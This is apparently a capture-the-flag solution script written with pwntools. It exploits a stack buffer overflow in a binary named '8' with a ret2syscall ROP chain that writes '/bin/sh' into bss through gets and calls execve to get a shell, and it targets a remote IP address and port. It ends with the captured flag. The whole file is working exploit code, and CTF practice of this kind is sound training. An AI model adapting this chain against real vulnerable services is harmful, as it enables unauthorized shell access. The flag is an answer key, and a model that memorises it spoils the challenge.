# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    if args.REMOTE:
        p.sendline(b"13523090")
        p.sendline(b"8")

    exe = './8'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    # Attack goes here
    pop_rax = 0x000000000042c0cb            # ropper --file 8 --search "pop rax"
    pop_rdi = 0x0000000000401c89            # ropper --file 8 --search "pop rdi"
    pop_rsi_pop_rbp = 0x000000000040bb92    # ropper --file 8 --search "pop rsi"
    pop_rdx = 0x0000000000401c8b            # ropper --file 8 --search "pop rdx"
    syscall = 0x0000000000401592            # ropper --file 8 --search "syscall"

    bss = 0x00000000004b6b80                # objdump -x 8 | grep bss
    gets = 0x40bf70                         # objdump -d 8 | grep gets (_IO_gets)
    offset = 120                            # offset = 112, offset + 8 = 120

    # ret2syscall
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(gets)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(pop_rsi_pop_rbp)
    payload += p64(0)
    payload += p64(0x69420)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(syscall)

    p.sendline(payload)
    p.sendline(b"/bin/sh\x00")               # input /bin/sh to get shell
    p.interactive()
    #do ls, then do 'cat 8.flag.txt'

solve()

# Orkom3{Let's kick it up a notch._d009541fa44e9215}